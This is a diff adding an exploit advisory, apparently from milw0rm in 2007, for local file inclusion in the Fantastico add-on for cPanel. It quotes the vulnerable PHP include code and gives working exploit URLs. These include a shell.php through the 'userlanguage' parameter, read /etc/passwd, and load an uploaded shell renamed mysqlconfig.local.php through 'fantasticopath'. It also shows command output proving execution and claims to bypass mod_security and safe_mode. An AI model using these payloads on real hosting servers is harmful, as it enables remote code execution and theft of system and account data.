@@ -1,0 +1,65 @@
+##############################################################
+Fantastico In all Version Cpanel 10.x <= local File Include
+
+##############################################################to the
+Note : Preparations php.ini in Cpanel  hypothetical and They also in
+all WebServer
+
+Must provide username  And pass  and login  :2082
+To break the strongest protection   mod_security  & safe_mode:On  &
+Disable functions :  All NONE
+
+
+
+Vulnerable Code ( 1  ) :
+ if(is_file($userlanguage))
+   {
+       include ( $userlanguage );
+
+In
+
+http://xx.com:2082/frontend/x/fantastico/includes/load_language.php
+
+
+
+Exploit  1 :
+http://xx.com:2082/frontend/x/fantastico/includes/load_language.php?userlanguage=/home/user/shell.php
+
+id
+uid=32170(user) gid=32170(user) groups=32170(user)
+
+Exploit  2 :
+http://xx.com:2082/frontend/x/fantastico/includes/load_language.php?userlanguage=/etc/passwd
+
+###################################################
+Vulnerable Code ( 2  ) :
+
+$localmysqlconfig=$fantasticopath . "/includes/mysqlconfig.local.php";
+if (is_file($localmysqlconfig))
+       {
+       include($localmysqlconfig);
+
+in
+http://xx.com:2082/frontend/x/fantastico/includes/mysqlconfig.php
+And also many of the files of the program
+
+Exploit :
+First Create directory Let the name (/includes/)
+and upload Shell.php  in (/includes/) Then  rename
+mysqlconfig.local.php       D:
+
+:::xploit::::
+http://xx.com:2082/frontend/x/fantastico/includes/mysqlconfig.php?fantasticopath=/home/user/
+
+
+
+###################################################
+
+
+Discoverd By : cyb3rt & 020
+###################################################
+
+Special Greetings :_ Tryag-Team  &  4lKaSrGoLd3n-Team
+###################################################
+
+# milw0rm.com [2007-03-11]
